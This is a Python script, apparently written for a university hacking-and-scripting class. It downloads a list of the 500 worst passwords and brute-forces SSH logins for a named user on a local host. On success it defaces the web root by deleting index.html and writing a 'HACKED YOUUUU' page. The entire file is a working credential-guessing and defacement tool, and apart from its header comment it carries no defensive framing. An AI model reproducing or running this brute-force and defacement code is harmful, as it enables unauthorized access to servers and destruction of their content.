# Script i wrote in a class called DAT234 - Hacking & Scripting
# where it download's and parses out the top 500 worst passwords
# and then tries all of the 500 password until it finds the rigth match!

import pexpect
#import pdb
import wget
from time import sleep
import os
from bs4 import BeautifulSoup

output = []

def motd():
    print ("REMEMBER!!!, MUST RUN WITH PYTHON3!")
    sleep(5)
    print ("______     ______            _       ")
    print ("| ___ \    | ___ \          | |      ")
    print ("| |_/ /   _| |_/ /_ __ _   _| |_ ___ ")
    print ("|  __/ | | | ___ \ '__| | | | __/ _ \")
    print ("| |  | |_| | |_/ / |  | |_| | ||  __/")
    print ("\_|   \__, \____/|_|   \__,_|\__\___|")
    print ("       __/ |                         ")
    print ("      |___/                          ")
    print (" ")
    print ("Authors: Bendik E.D (Skandix) \n")

def pw_list():

    os.path.exists("the-top-500-worst-passwords-of-all-time") and os.remove("the-top-500-worst-passwords-of-all-time")

    url = "http://www.whatsmypass.com/the-top-500-worst-passwords-of-all-time"
    download = wget.download(url)
    soup = BeautifulSoup(open(download), 'html.parser')

    for row in soup.select('table td'):
        for j in row:
            if len(j) > 2 and len(j) < 9:
                output.append(j)

    print ("\nPasswords Downloaded & Parsed and Sorted!\n")

def bruteforce(userName, hostName):
    print ("##### Starting Bruteforce #####")
    print ("###############################")
    print ("Target Host: ", hostName)
    print ("Target User: ", userName)
    print ("##############################\n")

    child = pexpect.spawn('ssh %s@%s' % (userName, hostName))

    for k in output:
           print ("Trying %s" % (k))
           child.expect(["password",pexpect.TIMEOUT,pexpect.EOF],2)
           child.sendline(k)
           res = child.expect(['%s@.*\:\~\$.*' % (userName),pexpect.TIMEOUT,pexpect.EOF],2)
           print(res)

           if(res == 2):
              child = pexpect.spawn('ssh %s@%s' % (userName, hostName))

           if(res == 0):

              print ('###Access Granted!###\n The password for %s is %s' % (userName, k ))
              print ("Hacking Started")
              sleep(1)
              child.sendline('touch IHackedYou_1337')
              sleep(1)
              child.sendline('cd www/')
              sleep(1)
              child.sendline('rm index.html')
              sleep(1)
              child.sendline('echo "<html><head><title>HACKED YOUUUU</title></head><body><center><h1>I Hacked You</h1><h2>-Kind Regards Group4 C:</h2><img src="http://i.imgur.com/iVHfwLc.gif"></center></html>" > index.html')
              sleep(1)
              print ("Hacking Finished")
              break

motd()
pw_list()
bruteforce("group4", "10.0.0.50")
